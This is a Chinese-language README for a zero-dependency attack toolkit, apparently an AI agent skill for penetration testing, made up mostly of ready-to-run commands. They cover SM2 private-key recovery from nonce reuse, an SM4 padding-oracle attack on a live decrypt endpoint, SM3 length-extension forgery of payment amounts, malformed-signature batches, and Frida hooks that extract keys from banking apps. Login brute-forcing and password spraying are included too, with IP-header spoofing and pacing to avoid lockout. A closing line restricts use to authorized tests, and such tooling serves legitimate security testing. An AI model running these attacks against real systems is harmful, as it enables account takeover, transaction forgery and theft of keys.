# 国密/加密攻击工具集 (零依赖, 纯 Python)

配合本技能（jiejieskill）加解密与国密测试章节使用。**无需安装任何库**，Python 3.8+ 直接跑。

## 工具总览

| 脚本 | 用途 | 场景 |
|---|---|---|
| `sm4.py` | SM4 加解密 (ECB/CBC/CTR, PKCS7) | App/Web 请求流量解密 |
| `sm2_k_reuse.py` | SM2 随机数 k 复用 → **恢复私钥** | 交易报文签名伪造 |
| `sm2_blind_sign.py` | **SM2 盲签名**协议 (盲性验证) | e-cash/匿名凭证类系统测试 |
| `sm2_sign_tools.py` | **恶意签名**: 畸形签名批次/延展性检测/指定k签名 | 验签接口健壮性测试 |
| `sm4_padding_oracle.py` | SM4-CBC **padding oracle** 攻击 (无需密钥解密) | 加密报文/回调密文还原 |
| `sm3_length_ext.py` | **SM3 长度扩展**攻击 (构造伪造签名) | `SM3(secret‖msg)` 拼接认证绕过 |
| `xor_decrypt.py` | 自定义 XOR/Base64 破解 | 前端/App 弱加密还原 |
| `crypto_scan.py` | 硬编码密钥/IV 扫描器 | 反编译产物/JS 中找 key |
| `frida_hook_crypto.js` | Frida 运行时抓 key/iv/明文密文 | 动态 key/加固 App |
| `frida_run.py` | Frida 启动器 (attach/spawn, 落盘日志) | 配合上者使用 |
| `http_brute.py` | **HTTP 表单/API 在线密码爆破** (零依赖, 并发/CSRF/XFF/代理) | Web 登录爆破 |

## 典型工作流

```
① 抓包拿到 App 加密请求流量
       │
② crypto_scan.py 扫出硬编码 SM4 key/iv
       │
③ sm4.py 用扫到的 key/iv 解密流量 → 明文 JSON
       │
④ 明文上继续测越权/重放/逻辑漏洞
```

## 快速命令

```bash
# SM4 解密 (CBC, hex 密文)
python sm4.py -m cbc -d --hex -k <key_hex> --iv <iv_hex> <cipher_hex>
# SM4 解密 (ECB, base64 密文)
python sm4.py -m ecb -d --b64 -k <key_hex> <cipher_b64>
# SM4 字典尝试 keylist (已知明文头时 --auto 自动判定)
python sm4.py -m cbc -d --hex --keylist keys.txt --iv <iv_hex> cipher.txt

# SM2 k 复用私钥恢复 (自检)
python sm2_k_reuse.py --selftest
# SM2 k 复用私钥恢复 (实战)
python sm2_k_reuse.py --msg1 <hex> --r1 <hex> --s1 <hex> \
    --msg2 <hex> --r2 <hex> --s2 <hex> --px <hex> --py <hex>

# XOR 单字节爆破
python xor_decrypt.py -b64 <cipher_b64>
# XOR 多字节已知明文推导 key
python xor_decrypt.py -b64 <cipher_b64> --known '{"amt":'

# 扫描硬编码密钥 (递归目录)
python crypto_scan.py /path/to/jadx_out -r --json

# Frida 运行时抓 key/iv (需 pip install frida-tools + 设备端 frida-server)
python frida_run.py com.bank.app                    # USB 热附加
python frida_run.py com.bank.app --spawn            # 冷启动 (抓启动阶段加密)
python frida_run.py com.bank.app --device emulator  # 模拟器

# Padding oracle 自检 (本地模拟 oracle 验证攻击逻辑)
python sm4_padding_oracle.py --selftest
# Padding oracle 实战 (HTTP oracle: POST {param:b64密文}, 200=填充有效)
python sm4_padding_oracle.py --b64 <密文> --iv <hex> \
    --url http://target/api/decrypt --param data [--valid-marker ok]
# 复杂 oracle: 自定义 oracle(ct)->bool 文件
python sm4_padding_oracle.py --hex -i cipher.hex --iv <hex> --oracle-file my_oracle.py

# SM3 长度扩展自检
python sm3_length_ext.py --selftest
# SM3 长度扩展: 已知 secret 长度
python sm3_length_ext.py --secret-len 16 --message "amount=100&to=6222" \
    --digest <hex> --append "&amount=0.01"
# 长度未知: 爆破 1..64 并用 --secret 真实验证
python sm3_length_ext.py --bruteforce 64 --message "amount=100&to=6222" \
    --digest <hex> --append "&amount=0.01" --secret testsecret123456

# SM2 盲签名: 自检 / 协议演示
python sm2_blind_sign.py --selftest
python sm2_blind_sign.py --demo --message "转账 100 元"

# SM2 恶意签名: 畸形签名批次 (提交目标验签接口, 任一被接受=校验缺陷)
python sm2_sign_tools.py --malformed --message "amount=100&to=6222"
# 延展性检测 / 指定 k 签名 / 通用签名验签
python sm2_sign_tools.py --malleability --message "转账" --r <hex> --s <hex> --px <hex> --py <hex>
python sm2_sign_tools.py --sign --message "amount=100" --k 1
python sm2_sign_tools.py --verify --message "amount=100" --r <hex> --s <hex> --px <hex> --py <hex>
```

#### HTTP 表单在线爆破 (零依赖, 非加解密)

```bash
python http_brute.py --selftest                      # 自检 (本地假服务端到端)
# 单用户 × 密码字典
python http_brute.py -u admin -P pass.txt --url https://target/login \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 10 --xff --stop-on-hit
# 密码喷射 (用户字典 × 单密码, 防锁定)
python http_brute.py -L users.txt -p 'Spring2025!' --url https://target/login \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 5 --delay 0.3
# JSON 登录
python http_brute.py -u admin -P pass.txt --url https://api/login --json \
    --data '{"u":"^USER^","p":"^PASS^"}' --found-marker '"token"'
# CSRF token: 先 GET 取 token 注入 ^TOKEN^
python http_brute.py -u admin -P pass.txt --url https://target/login \
    --data "csrf=^TOKEN^&user=^USER^&pass=^PASS^" \
    --csrf-url https://target/login --csrf-regex 'name="csrf" value="([^"]+)"' --fail-marker "Invalid"
# 走 Burp 代理
python http_brute.py -u admin -P pass.txt --url https://target/login \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" --proxy http://127.0.0.1:8080
# 内置弱口令字典 (wordlists/weakpass.txt, 无需 -P): --weakpass [分类, 不填=全部]
python http_brute.py -u admin --weakpass --url https://target/login \
    --data "user=^USER^&pass=^PASS^" --fail-marker "Invalid" -t 10 --xff --stop-on-hit
python http_brute.py -u root --weakpass service,db --url ... --data ... --fail-marker "Invalid"
```

## 验证状态

- `sm4.py`: 通过 GB/T 32907 标准测试向量; ECB/CBC/CTR 加解密往返 + 中文明文均正确
- `sm2_k_reuse.py`: SM3 通过国标向量 (SM3("abc") 等); 自检恢复私钥与测试私钥**完全一致**, 恢复公钥验签通过
- `sm2_blind_sign.py`: 协议往返签名可被标准验签通过; 同一消息多次盲化 r' 各不相同 (会话不可关联)
- `sm2_sign_tools.py`: 10 种畸形签名 + 6 种延展性变体标准验签全部拒绝; k=1 指定 nonce 可验签
- `sm4_padding_oracle.py`: 自检通过全部用例 (短块/整块填充值/多块随机/中文多块); 含多候选消歧逻辑
- `sm3_length_ext.py`: 自检通过 (空消息/多块/随机); 伪造摘要与真实 `SM3(secret‖forged)` 完全一致
- `xor_decrypt.py`: 单字节爆破可区分真明文 (引号密度加权)
- `crypto_scan.py`: 可识别 SM4_KEY/AES_IV 等带前缀命名, 支持 ★crypto 重点标注

## Frida 使用前置 (仅 frida 两个脚本需要)

```bash
# 电脑端
pip install frida-tools
# 设备端: root 手机/模拟器, 下载与电脑 frida 同版本、同架构的 frida-server
#   https://github.com/frida/frida/releases  (android-arm64 / x86_64)
adb push frida-server /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"
adb forward tcp:27042 tcp:27042    # 非 USB 直连时用
# 验证
frida-ps -U
```

`frida_hook_crypto.js` 覆盖: `Cipher`/`SecretKeySpec`/`IvParameterSpec`、BouncyCastle `SM4Engine`/`KeyParameter`、GMHelper、MessageDigest(可选)；native 层给出 `Interceptor.attach` 模板与符号 strip 时的 JNI 定位思路。各 hook 相互隔离，类不存在自动跳过，按目标实际类名/方法名增删。

## 注意事项

- **国密算法本身安全**, 这些脚本攻的是**实现缺陷**: 硬编码密钥 / k 复用 / 弱随机 / 自定义 XOR
- SM4 的 `sm4.py` 默认 PKCS7 填充; 目标若用 NoPadding 需 `--padding none`
- `sm2_k_reuse.py` 需要已知公钥 (公开信息, 证书/App 内获取) 用于计算 e 值
- XOR 已知明文推导 key 只能恢复 `len(known)` 字节, key 更长需更多已知明文
- Frida hook 加固/反调试 App 需先脱壳过检测 (见 `app-pentest` skill), 抓 key 期间避开生产交易
- 仅用于**已获书面授权**的渗透测试
